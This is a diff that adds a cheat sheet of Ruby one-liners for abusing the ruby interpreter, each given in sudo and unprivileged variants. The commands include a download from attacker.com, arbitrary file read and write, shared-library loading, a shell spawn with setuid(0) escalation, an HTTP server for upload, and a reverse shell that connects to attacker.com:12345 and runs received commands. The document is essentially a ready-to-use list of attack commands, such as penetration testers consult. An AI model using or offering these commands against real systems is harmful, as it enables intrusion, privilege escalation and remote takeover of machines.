@@ -1,0 +1,68 @@
+ruby
+====
+
+Download
+--------
+
+[Sudo]
+    ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download, "/path/to/output-file")'
+
+[Unprivileged]
+    ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download, "/path/to/output-file")'
+
+File read
+---------
+
+[Sudo]
+    ruby -e 'puts File.read("/path/to/input-file")'
+
+[Unprivileged]
+    ruby -e 'puts File.read("/path/to/input-file")'
+
+File write
+----------
+
+[Sudo]
+    ruby -e 'File.open("/path/to/output-file", "w+") { |f| f.write("DATA") }'
+
+[Unprivileged]
+    ruby -e 'File.open("/path/to/output-file", "w+") { |f| f.write("DATA") }'
+
+Library load
+------------
+
+[Sudo]
+    ruby -e 'require "fiddle"; Fiddle.dlopen("/path/to/lib.so")'
+
+[Unprivileged]
+    ruby -e 'require "fiddle"; Fiddle.dlopen("/path/to/lib.so")'
+
+Reverse shell
+-------------
+
+[Sudo]
+    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+[Unprivileged]
+    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+Shell
+-----
+
+[Capabilities]
+    ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
+
+[Sudo]
+    ruby -e 'exec "/bin/sh"'
+
+[Unprivileged]
+    ruby -e 'exec "/bin/sh"'
+
+Upload
+------
+
+[Sudo]
+    ruby -run -e httpd . -p 80
+
+[Unprivileged]
+    ruby -run -e httpd . -p 80
